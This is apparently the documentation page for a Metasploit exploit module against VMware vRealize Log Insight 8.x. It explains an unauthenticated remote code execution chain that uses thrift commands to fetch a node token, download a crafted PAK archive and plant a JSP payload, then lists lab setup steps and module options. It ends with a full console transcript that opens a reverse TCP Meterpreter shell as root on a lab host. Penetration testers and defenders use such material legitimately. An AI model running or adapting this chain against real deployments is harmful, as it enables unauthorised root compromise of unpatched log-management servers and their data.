## Vulnerable Application

vRealize Log Insight provides intelligent log management for infrastructure and applications
in any environment. This highly scalable log management solution delivers intuitive, actionable
dashboards, sophisticated analytics, and broad third-party extensibility across physical, virtual,
and cloud environments.

VMware vRealize Log Insights versions v8.x contain multiple vulnerabilities, such as
directory traversal, broken access control, deserialization, and information disclosure.
When chained together, these vulnerabilities allow a remote, unauthenticated attacker to
execute arbitrary commands on the underlying operating system as the root user.

This module exploits multiple vulnerabilities for achieving unauthenticated remote code execution
on the VMware vRealize Log Insight version `v8.x`. Module achieves code execution via triggering a
`RemotePakDownloadCommand` command via the exposed thrift service after obtaining the node token by
calling a `GetConfigRequest` thrift command. After the download, it will trigger a `PakUpgradeCommand` for
processing the specially crafted PAK archive, which then will place the JSP payload under a
certain API endpoint (pre-authenticated) location upon extraction for gaining remote code execution.

The original analysis and POC is done by the Horizon3.ai Team.
Check [here](https://www.horizon3.ai/vmware-vrealize-log-insight-vmsa-2023-0001-technical-deep-dive/) for full disclosure writeup.

## Testing
For installing the vulnerable version follow the steps below,
1. To obtain the vulnerable OVA image, first create a customer account at
[VMware](https://customerconnect.vmware.com/account-registration) (trial license is sufficient)
2. Navigate [here](https://customerconnect.vmware.com/downloads/details?downloadGroup=VRLI-8102&productId=1351) and download `Virtual Appliance`
3. Import the OVA image into a virtualization software (VirtualBox is used for this case).
4. Start the `VMware_vCenter_Log_Insight` image and proceed with the initial installation steps through the web interface of the product.

After these steps, the web portal (port 80/443) and Apache thrift service (port 16520) should be accessible.

## Verification Steps

1. msfconsole
2. Do: `use exploit/linux/http/vmware_vrli_rce`
3. Do: `set RHOST [IP]`
4. Do: `check`

## Options

### THRIFT_PORT
This is the Thrift service port for VMware xRealize Log Insight.

### ThriftTimeout
Thrift response and connection timeout duration.

## WaitForUpgradeDuration
This value represents the duration of wait after issuing a PakUpgrade command.

## Scenarios

```
msf6 > use exploit/linux/http/vmware_vrli_rce 
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/vmware_vrli_rce) > set rhosts 192.168.56.107
rhosts => 192.168.56.107
msf6 exploit(linux/http/vmware_vrli_rce) > set lhost 192.168.56.1 
lhost => 192.168.56.1
msf6 exploit(linux/http/vmware_vrli_rce) > set srvhost 192.168.56.1 
srvhost => 192.168.56.1
msf6 exploit(linux/http/vmware_vrli_rce) > run

[*] Started reverse TCP handler on 192.168.56.1:4444 
[*] 192.168.56.107:443 - Running automatic check ("set AutoCheck false" to disable)
[*] 192.168.56.107:443 - Checking if 192.168.56.107:443 can be exploited.
[+] 192.168.56.107:443 - The target appears to be vulnerable. VMware XRLI Version: 8.10
[*] 192.168.56.107:443 - Starting Payload Server
[*] 192.168.56.107:443 - Using URL: http://192.168.56.1:8080/IssIrRP.tar
[*] 192.168.56.107:443 - Fetching thrift config...
[+] 192.168.56.107:443 - Obtained node token: 015dd665-9f84-4efc-9fd2-1ea2e467dbf8
[*] 192.168.56.107:443 - Sending getNodeType...
[*] 192.168.56.107:443 - Sending RemotePakDownloadCommand...
[*] 192.168.56.107:443 - Sending PakUpgradeCommand...
[*] 192.168.56.107:443 - Encoding the payload as JSP
[*] 192.168.56.107:443 - Malicious TAR payload created (117760 bytes)
[+] 192.168.56.107:443 - Payload requested by 192.168.56.107:443, sending...
[+] 192.168.56.107:443 - PakUpgrade request is successful
[*] 192.168.56.107:443 - Waiting 2 second for PakUpgrade...
[*] 192.168.56.107:443 - 192.168.56.107:443 - Triggering JSP payload...
[*] Sending stage (3045380 bytes) to 192.168.56.107
[+] 192.168.56.107:443 - Deleted /tmp/IssIrRP.pak
[+] 192.168.56.107:443 - Deleted /usr/lib/loginsight/application/3rd_party/apache-tomcat-8.5.82/webapps/ROOT/loginsight/api/api-v5-documentation.jsp
[*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.107:57010) at 2023-09-07 19:48:14 +0200
[*] 192.168.56.107:443 - Server stopped.

meterpreter > getuid 
Server username: root
meterpreter > sysinfo 
Computer     : 192.168.56.107
OS           : VMware Photon OS 3.0 (Linux 4.19.256-1.ph3)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > 

```
